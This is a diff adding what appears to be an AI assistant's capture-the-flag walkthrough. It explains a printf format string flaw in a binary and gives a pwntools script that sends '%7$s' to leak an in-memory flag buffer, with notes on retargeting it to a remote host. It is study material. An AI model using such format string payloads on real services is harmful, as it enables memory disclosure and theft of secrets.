@@ -1,0 +1,96 @@
+To solve this challenge using `pwntools`, you can exploit the format string vulnerability present in the program. The vulnerability lies in the `printf(format)` call, where user-controlled input (`format`) is directly passed to `printf` without proper sanitization. This allows you to perform arbitrary memory reads and potentially write to memory if the binary is not protected by certain mitigations.
+
+Here are the steps to solve the challenge:
+
+---
+
+### Steps to Solve the Challenge
+
+1. **Analyze the Binary**:
+   - The binary reads the flag from `flag.txt` into the `v10` buffer.
+   - It then asks the user for input and compares the input with the flag.
+   - If the input doesn't match the flag, it prints the user input using `printf(format)`, which is vulnerable to a format string attack.
+
+2. **Exploit the Format String Vulnerability**:
+   - Use the format string vulnerability to leak the contents of the `v10` buffer (which contains the flag).
+   - The `%s` or `%p` format specifiers can be used to read memory addresses.
+
+3. **Write the Exploit Script**:
+   - Use `pwntools` to interact with the binary.
+   - Craft a payload to exploit the format string vulnerability and leak the flag.
+
+4. **Run the Exploit**:
+   - Execute the script to retrieve the flag.
+
+---
+
+### Exploit Code Using `pwntools`
+
+Here is the Python exploit script:
+
+```python
+from pwn import *
+
+# Set up the binary and context
+binary = './fmt'  # Path to the binary
+context.binary = binary
+elf = ELF(binary)
+
+# Start the process (or connect to remote if applicable)
+p = process(binary)
+
+# Interact with the binary
+p.recvuntil("what's the flag\n")  # Wait for the prompt
+
+# Craft the payload to leak the flag
+# Use %p to leak memory addresses, or %s if you know the address of the flag buffer
+payload = b"%7$s"  # Assuming the flag buffer is at the 7th argument on the stack
+
+# Send the payload
+p.sendline(payload)
+
+# Receive the output
+response = p.recvall()
+
+# Extract the flag from the response
+print("Flag:", response.decode(errors='ignore'))
+```
+
+---
+
+### Explanation of the Code
+
+1. **Binary Setup**:
+   - The binary is loaded using `pwntools`' `ELF` module for analysis.
+   - The `process` function is used to run the binary locally.
+
+2. **Payload Construction**:
+   - The `%7$s` format specifier is used to read the 7th argument on the stack as a string. This is a common offset for user input in format string vulnerabilities, but you may need to adjust it based on the stack layout of the binary.
+
+3. **Interaction**:
+   - The script waits for the prompt (`what's the flag`) and sends the crafted payload.
+
+4. **Flag Extraction**:
+   - The response from the binary is captured and decoded to extract the flag.
+
+---
+
+### Notes
+
+- The exact offset (`%7$s`) may vary depending on the binary's stack layout. You can use `%p` to print multiple stack addresses and determine the correct offset for the flag buffer.
+- If the binary is running on a remote server, replace `process(binary)` with `remote('host', port)` to connect to the server.
+- Ensure that the `flag.txt` file is present in the same directory as the binary when testing locally.
+
+---
+
+### Example Output
+
+If the flag is `CTF{example_flag}`, the script will output:
+
+```
+Flag: CTF{example_flag}
+```
+
+---
+
+Let me know if you need further clarification or assistance!
